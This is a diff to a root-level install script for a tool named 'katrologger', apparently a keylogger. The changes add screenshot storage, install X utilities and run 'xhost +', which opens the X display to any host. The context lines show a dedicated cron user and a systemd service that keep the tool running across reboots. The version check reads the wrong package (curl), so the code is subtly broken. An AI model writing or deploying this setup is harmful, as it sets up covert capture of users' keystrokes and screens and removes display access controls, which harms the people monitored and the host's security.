@@ -5,7 +5,23 @@ RUN="/root/.katrologger/run"
 ARG="/root/.katrologger/run/arg"
 SERVICE="/etc/systemd/system/katrologger.service"
 CRON="/etc/cron.allow"
+SCREENSHOTS="/root/.katrologger/screenshots"
 
+###### CHECKING PACKAGES ######
+if which apt &> /dev/null
+then
+   if ! dpkg -s x11-xserver-utils &> /dev/null
+   then
+      echo "Installing: x11-xserver-utils"
+      apt install -y x11-xserver-utils &> /dev/null
+   fi
+   XSERVER_UTILS_VERSION=$(dpkg-query -W -f='${Version}' curl)
+   echo "[+] x11-xserver-utils $XSERVER_UTILS_VERSION installed"
+   xhost + &> /dev/null
+   echo "[+] adding connection permission to the X server: xhost +"
+fi
+
+###### CRON ######
 if [ $(grep cronjob /etc/passwd | grep -c cronjob) -eq 1 ]
 then
   echo "[+] cronjob user already exists"
@@ -22,7 +38,6 @@ then
     echo "cronjob" >> /etc/cron.allow
 fi
 
-echo
 ###### CONFIG ######
 echo "[+] creating settings for the katrologer in /root/.katrologer/..."
 if [ ! -d $CONFIG ]; then
@@ -40,7 +55,12 @@ if [ ! -d $RUN ]; then
   echo "[ok] create directory: $RUN"
 fi
 
-echo
+if [ ! -d $SCREENSHOTS ]; then
+  mkdir -p $SCREENSHOTS
+  chown cronjob $SCREENSHOTS
+  echo "[ok] create directory: $SCREENSHOTS"
+fi
+
 ###### SYSTEMD UNIT FILES ######
 echo "[+] systemd: create unit-file in --> $SERVICE"
 cat << 'EOF' > $SERVICE
